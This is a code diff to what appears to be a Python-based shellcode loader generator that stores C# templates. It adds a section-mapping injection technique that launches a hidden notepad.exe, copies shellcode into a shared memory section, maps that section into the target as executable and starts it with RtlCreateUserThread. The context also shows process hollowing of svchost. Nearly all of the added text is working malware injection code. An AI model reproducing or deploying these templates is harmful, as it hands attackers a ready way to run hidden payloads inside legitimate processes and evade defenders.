@@ -1,6 +1,8 @@
 import base64
 import subprocess
 
+# References: https://github.com/plackyhacker/Shellcode-Injection-Techniques
+
 DLL_IMPORT = {
   "VirtualAlloc": "",
   "CreateThread": "",
@@ -250,6 +252,96 @@ START_PROCESS_HOLLOW_CODE = """
       IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
       WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
       ResumeThread(pi.hThread);
+"""
+
+START_PROCESS_INTERPROCESS_IMPORT = """
+        [DllImport("ntdll.dll", SetLastError=true)]
+        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
+        static extern int NtClose(IntPtr hObject);
+
+        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref UInt64 MaximumSize, MemoryProtection SectionPageProtection,	MappingAttributes AllocationAttributes, IntPtr FileHandle);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref UInt64 SectionOffset, ref UInt64 ViewSize, uint InheritDisposition, UInt32 AllocationType, MemoryProtection Win32Protect);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);
+
+        [Flags]
+	public enum SectionAccess : UInt32
+	{
+            SECTION_EXTEND_SIZE = 0x0010,
+            SECTION_QUERY = 0x0001,
+            SECTION_MAP_WRITE = 0x0002,
+			SECTION_MAP_READ = 0x0004,
+			SECTION_MAP_EXECUTE = 0x0008,
+			SECTION_ALL_ACCESS = 0xe
+        }
+        public enum MemoryProtection : UInt32
+        {
+            PAGE_EXECUTE = 0x00000010,
+            PAGE_EXECUTE_READ = 0x00000020,
+            PAGE_EXECUTE_READWRITE = 0x00000040,
+            PAGE_EXECUTE_WRITECOPY = 0x00000080,
+            PAGE_NOACCESS = 0x00000001,
+            PAGE_READONLY = 0x00000002,
+            PAGE_READWRITE = 0x00000004,
+            PAGE_WRITECOPY = 0x00000008,
+            PAGE_GUARD = 0x00000100,
+            PAGE_NOCACHE = 0x00000200,
+            PAGE_WRITECOMBINE = 0x00000400
+        }
+
+        [Flags]
+        public enum MappingAttributes : UInt32
+        {
+            SEC_COMMIT = 0x8000000,
+            SEC_IMAGE = 0x1000000,
+            SEC_IMAGE_NO_EXECUTE = 0x11000000,
+            SEC_LARGE_PAGES = 0x80000000,
+            SEC_NOCACHE = 0x10000000,
+            SEC_RESERVE = 0x4000000,
+            SEC_WRITECOMBINE = 0x40000000
+        }
+
+	[StructLayout(LayoutKind.Sequential, Pack = 0)]
+         public struct CLIENT_ID
+		{
+			public IntPtr UniqueProcess;
+			public IntPtr UniqueThread;
+		}
+"""
+
+START_PROCESS_INTERPROCESS_CODE = """
+          ProcessStartInfo start = new ProcessStartInfo();
+          start.Arguments = ""; 
+          start.FileName = "notepad.exe";
+          start.WindowStyle = ProcessWindowStyle.Hidden;
+          start.CreateNoWindow = true;
+          int exitCode;
+          // Run the external process & wait for it to finish
+          using (Process proc = Process.Start(start))
+          {
+              Process target = null;
+              Process[] processes = Process.GetProcessesByName("notepad");
+              target = processes[0];
+              IntPtr hSectionHandle = IntPtr.Zero;
+              IntPtr pLocalView = IntPtr.Zero;
+              UInt64 size = (UInt32)shellcode.Length;
+              UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);
+              const UInt32 ViewUnmap = 0x2;
+              UInt64 offset = 0;
+              result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_READWRITE);
+              Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
+              IntPtr pRemoteView = IntPtr.Zero;
+              NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
+              IntPtr hThread = IntPtr.Zero;
+              CLIENT_ID cid = new CLIENT_ID();
+              RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
+         }
 """
 
 ### OTHER IMPORTS
